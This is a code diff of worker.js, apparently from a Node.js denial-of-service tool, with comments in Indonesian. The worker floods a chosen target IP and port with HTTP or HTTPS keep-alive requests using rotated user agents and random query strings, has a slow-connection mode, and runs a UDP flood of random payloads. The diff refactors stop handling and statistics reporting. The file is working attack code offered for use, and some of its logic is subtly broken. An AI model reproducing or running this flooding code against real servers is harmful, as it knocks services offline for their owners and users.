@@ -1,65 +1,49 @@
 // File: worker.js
 const { parentPort, workerData } = require('worker_threads');
 const net = require('net');
-const tls = require('tls'); // Untuk koneksi HTTPS
+const tls = require('tls'); 
 const crypto = require('crypto');
-const dgram = require('dgram'); // Diperlukan untuk UDP
+const dgram = require('dgram'); 
+const path = require('path'); // Untuk akses USER_AGENTS jika di file terpisah
 
 // Mengakses workerData di level teratas worker
-const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId } = workerData;
-
-// --- Konfigurasi Tambahan ---
-const USER_AGENTS = [ // Daftar user agent yang sama (perlu diisi ulang jika Anda belum)
-    "Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 7.0; SM-G930F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.141 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi 9T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Mi 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.91 Mobile Safari/537.36",
-    "Mozilla/5.0 (Linux; Android 10; HMD Global Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
-];
-const CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+const { targetIP, port, attackType, mode, durationMs, httpMethod, workerId, USER_AGENTS, CHARSET } = workerData;
 
 // --- Statistik Worker ---
 let sentRequests = 0;
-let activeConnections = 0; // Ini adalah jumlah koneksi yang dikelola worker ini
+let activeConnections = 0; 
 let errors = 0;
 let serverErrors = 0;
 let durationTimer = null; // Timer untuk durasi serangan
+let isStopping = false; // Flag untuk menghentikan worker
 
 // --- Helper Functions ---
+// Pastikan USER_AGENTS dan CHARSET tersedia di sini.
+// Jika tidak dikirim via workerData, definisikan ulang atau impor.
+const LOCAL_USER_AGENTS = USER_AGENTS || [ /* fallback user agents */ "HydraWorkerClient" ];
+const LOCAL_CHARSET = CHARSET || 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+
 function getRandomBigInt(max) {
     try {
         const buffer = crypto.randomBytes(Math.ceil(Math.log2(max) / 8));
         const num = buffer.readUIntBE(0, buffer.length);
         return num % max;
     } catch (e) {
-        return Math.floor(Math.random() * max); // Fallback
+        return Math.floor(Math.random() * max);
     }
 }
 
 function generateRandomString(length) {
     let result = '';
     for (let i = 0; i < length; i++) {
-        result += CHARSET[getRandomBigInt(CHARSET.length)];
+        result += LOCAL_CHARSET[getRandomBigInt(LOCAL_CHARSET.length)];
     }
     return result;
 }
 
 function getRandomUserAgent() {
-    if (USER_AGENTS.length === 0) return 'HydraWorkerClient';
-    return USER_AGENTS[getRandomBigInt(USER_AGENTS.length)];
+    if (LOCAL_USER_AGENTS.length === 0) return 'HydraWorkerClient';
+    return LOCAL_USER_AGENTS[getRandomBigInt(LOCAL_USER_AGENTS.length)];
 }
 
 function parseHTTPStatus(responseData) {
@@ -78,27 +62,27 @@ function parseHTTPStatus(responseData) {
 
 // --- Logika Serangan HTTP ---
 async function httpAttack(socket, target, method, mode) {
-    const startTime = Date.now();
     const requestQueue = [];
-    let lastWriteTime = Date.now(); // Diperlukan untuk mode slow
-    
-    // Initial request queue population
+    let lastWriteTime = Date.now(); 
+
     for (let i = 0; i < 100; i++) { requestQueue.push(generateRandomString(10)); }
 
-    // Timer untuk durasi serangan
+    // Timer durasi serangan
     if (durationMs !== null) {
         durationTimer = setTimeout(() => {
             // console.log(`Worker ${workerId}: Attack duration reached. Closing connection.`);
-            socket.end(); // Menutup koneksi untuk mengakhiri loop
+            if (!socket.destroyed) socket.end(); // Tutup koneksi jika belum ditutup
+            isStopping = true; // Tandai worker agar berhenti
         }, durationMs);
     }
 
-    // Fungsi loop utama untuk mengirim request
     const attackLoop = async () => {
-        if (socket.destroyed) return; // Jika socket sudah tidak valid
+        if (isStopping || socket.destroyed) {
+            // console.log(`Worker ${workerId}: Stopping/Destroyed. Exiting httpAttack.`);
+            return;
+        }
 
-        let requestIdentifier = requestQueue.shift() || generateRandomString(10); // Ambil dari antrian atau buat baru
-        
+        let requestIdentifier = requestQueue.shift() || generateRandomString(10); 
         let request = `${method} /?${requestIdentifier} HTTP/1.1\r\nHost: ${target}\r\nUser-Agent: ${getRandomUserAgent()}\r\nConnection: keep-alive\r\n`;
 
         if (mode === 'slow') {
@@ -108,12 +92,7 @@ async function httpAttack(socket, target, method, mode) {
         try {
             socket.write(request);
             sentRequests++;
-            activeConnections = 1; // Worker ini punya 1 koneksi aktif
-
-            if (mode === 'slow') {
-                 const slowData = `X-Hydra-KeepAlive: ${generateRandomString(15)}\r\n`;
-                 socket.write(slowData);
-            }
+            activeConnections = 1; 
             lastWriteTime = Date.now();
 
             // Menangani data yang diterima
@@ -124,20 +103,23 @@ async function httpAttack(socket, target, method, mode) {
                     parentPort.postMessage({ type: 'stats', serverErrors: 1 });
                 }
                 if (mode === 'normal') {
-                    // console.log(`Worker ${workerId}: Received response (normal mode), closing connection.`);
-                    socket.end(); // Tutup setelah respon di mode normal
+                    if (!socket.destroyed) socket.end(); // Tutup setelah respon di mode normal
                 }
             });
 
             socket.setTimeout(3000); // Timeout baca 3 detik
 
-            // Tambahkan request baru ke antrian untuk menjaga loop tetap berjalan
-            requestQueue.push(generateRandomString(10));
+            requestQueue.push(generateRandomString(10)); // Tambahkan request baru
+
+            // Kirim update stats secara berkala
+            if (sentRequests % 50 === 0) {
+                parentPort.postMessage({ type: 'stats', sent: 50, active: activeConnections, errors: 0, serverErrors: 0 });
+            }
 
         } catch (error) {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            socket.end(); // Tutup koneksi jika ada error tulis
+            if (!socket.destroyed) socket.end(); 
         }
         
         // Jadwalkan loop berikutnya
@@ -148,18 +130,20 @@ async function httpAttack(socket, target, method, mode) {
     attackLoop();
 }
 
-// Placeholder untuk serangan UDP
+// Logika Serangan UDP (Placeholder)
 async function udpAttack(socket, target, port) {
     const startTime = Date.now();
     while (true) {
+        if (isStopping) break; // Cek flag stop
         if (durationMs !== null && (Date.now() - startTime > durationMs)) break;
 
         try {
             const payload = Buffer.from(generateRandomString(500 + Math.floor(Math.random() * 500)));
             socket.send(payload, port, target);
             sentRequests++;
-            parentPort.postMessage({ type: 'stats', sent: 1 });
-            await new Promise(res => setTimeout(res, 10)); // Delay kecil
+            activeConnections = 1;
+            parentPort.postMessage({ type: 'stats', sent: 1, active: activeConnections });
+            await new Promise(res => setTimeout(res, 10)); 
         } catch (error) {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
@@ -173,26 +157,27 @@ async function runWorker() {
     let socket = null;
     let isConnectionSuccessful = false;
 
+    // Handler untuk menerima pesan dari main thread (misal: sinyal stop)
+    parentPort.on('message', (message) => {
+        if (message.type === 'stop') {
+            // console.log(`Worker ${workerId}: Received stop signal.`);
+            isStopping = true;
+            clearTimeout(durationTimer); // Hentikan timer durasi jika ada
+            if (socket && !socket.destroyed) {
+                socket.end(); // Tutup koneksi jika sedang aktif
+            }
+        }
+    });
+
     try {
-        // PERBAIKAN: Gunakan variabel 'port' dan 'attackType' yang sudah di-scope dari workerData
-        if (port === 443 || attackType === 'https') { // Pastikan 'port' dan 'attackType' diakses di sini
-            // Gunakan TLS untuk HTTPS (port 443 defaultnya adalah HTTPS)
-            const options = {
-                host: targetIP,
-                port: port,
-                timeout: 5000 // Timeout koneksi 5 detik
-            };
+        if (port === 443 || attackType.toLowerCase() === 'https') { // Gunakan HTTPS untuk port 443
+            const options = { host: targetIP, port: port, timeout: 5000 };
             socket = tls.connect(options);
         } else if (attackType === 'http') {
-            // Koneksi HTTP biasa
-            const options = {
-                host: targetIP,
-                port: port,
-                timeout: 5000 // Timeout koneksi 5 detik
-            };
+            const options = { host: targetIP, port: port, timeout: 5000 };
             socket = net.connect(options);
         } else if (attackType === 'udp') {
-            const socket = dgram.createSocket('udp4');
+            const socket = dgram.createSocket('udp4'); // Gunakan udp4
             
             socket.on('error', (err) => {
                 errors++;
@@ -200,16 +185,16 @@ async function runWorker() {
                 socket.close();
             });
 
-            socket.on('message', (msg, rinfo) => {
+            socket.on('message', (msg, rinfo) => { // Handle balasan UDP jika ada
                 serverErrors++;
                 parentPort.postMessage({ type: 'stats', serverErrors: 1 });
             });
 
             activeConnections = 1; 
             parentPort.postMessage({ type: 'stats', active: activeConnections });
-            await udpAttack(socket, targetIP, port); // Panggil fungsi UDP
+            await udpAttack(socket, targetIP, port); 
             socket.close();
-            return; // Keluar setelah UDP selesai
+            return; 
         } else {
             throw new Error(`Unsupported attack type: ${attackType}`);
         }
@@ -225,21 +210,19 @@ async function runWorker() {
         socket.on('timeout', () => {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            socket.end();
+            if (!socket.destroyed) socket.end(); 
         });
 
         socket.on('close', (hadError) => {
             activeConnections = 0;
             parentPort.postMessage({ type: 'stats', active: activeConnections });
-            clearTimeout(durationTimer); // Pastikan timer durasi dibersihkan
+            clearTimeout(durationTimer); 
         });
 
-        // Handler untuk error pada socket
         socket.on('error', (err) => {
             errors++;
             parentPort.postMessage({ type: 'stats', errors: 1 });
-            // console.error(`Worker ${workerId}: Socket error:`, err.message);
-            socket.end(); // Tutup jika ada error
+            if (!socket.destroyed) socket.end(); 
         });
 
     } catch (error) {
@@ -247,8 +230,9 @@ async function runWorker() {
         parentPort.postMessage({ type: 'stats', errors: 1 });
         console.error(`Worker ${workerId}: Global error in worker:`, error.message);
     } finally {
-        if (socket) socket.end(); // Pastikan socket tertutup
-        clearTimeout(durationTimer); // Pastikan timer durasi dibersihkan
+        // Pastikan worker mengirim pesan 'done' hanya sekali
+        if (socket && !socket.destroyed) socket.end(); // Pastikan socket tertutup
+        clearTimeout(durationTimer); 
         parentPort.postMessage({ type: 'done', workerId: workerId });
     }
 }
